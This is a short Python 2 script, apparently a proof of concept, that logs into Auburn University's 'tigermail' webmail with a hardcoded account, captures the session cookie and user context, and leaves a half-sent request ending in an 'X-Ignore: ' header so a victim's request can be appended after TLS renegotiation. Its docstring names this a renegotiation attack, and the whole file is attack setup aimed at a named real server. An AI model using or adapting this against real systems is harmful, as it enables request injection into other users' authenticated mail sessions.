import socket
import re

# Regular Expressions
rUser = re.compile('userContext = "([a-z0-f]+)";')
rCookie = re.compile('^Set-Cookie: (NJSCN=\d+)', re.MULTILINE) # were doing some multiline stuff at the header level (makes it less likely to match anythin else, though its already not going too)
rStatus = re.compile('^HTTP/1.[10] (\d{3}) \w+', re.MULTILINE) # matches the returned status

# Valid Username and Password to use
username = "luscoma"								# The username to use to login must be valid
password = "NotReal"								# The password to use to login

class TMSpoof:
	"""
		Spoofs a tigermail connection
		Getting the cookie and context, leaving the final request open
		For a renegoiation attack (appends X-Ignore-This:
	"""
	
	def __init__(self, sock):
		self.sock = sock
	
	def DoLogin(self):
		self.sock.send("POST /gw/webacc HTTP/1.1\r\n")
		self.sock.send("HOST: tigermail.auburn.edu\r\n")
		self.sock.send("User-Agent: PythonPWNER\r\n")
		self.sock.send("Content-Length: 145\r\n")
		self.sock.send("Connection: keep-alive\r\n")
		self.sock.send("Content-Type: application/x-www-form-urlencoded\r\n\r\n");
		self.sock.send("User.id=" + username + "&User.password=" + password + "&error=error&merge=webacc&User.interface=css&User.displayDraftItems=1&action=User.Login&Url.hasJavaScript=1\n\n")
		
		print "Data Sent"
		data = self.sock.recv(1024)	# going to be our status
		status = rStatus.search(data)
		cookie = rCookie.search(data)
		
		# Find The User Cookie
		if not status:
			print "Tigermail Login Failed: no status was returned"
			return False
		elif status.group(1) != '200':
			print "Tigermail Login Failed: HTTP Status Not OK (" + status.group() + ")"
		elif not cookie:
			print "Tigermail Login Failed: no cookie found" 
			return False			
		self.cookie = cookie.group(1)
		print "COOKIE: " + self.cookie
		
		# Find The User Contenxt
		while data:	# First few chunks have the context, so who cares			
			data = self.sock.recv(8192)	# message body
			context = rUser.search(data)
			if context:
				self.context = context.group(1)
				print "User Context: " + self.context
				self.sock.recv(8192)
				return True
		return False		
	
	def DoLogout(self):
		self.sock.send("GET /gw/webacc?User.context={0}&action=User.Logout&User.lang=en&merge=login HTTP/1.1\r\n".format(self.context))
		self.sock.send("HOST: tigermail.auburn.edu\r\n")
		self.sock.send("User-Agent: PythonPWNER\r\n")
		self.sock.send("Cookie: " + self.cookie + "\r\n")
		self.sock.send("X-Ignore: ")	# Leaves the connection open, so that stuff can be appended after renegotiation
		print "Logout Request Sent, Ready for renegotiation"
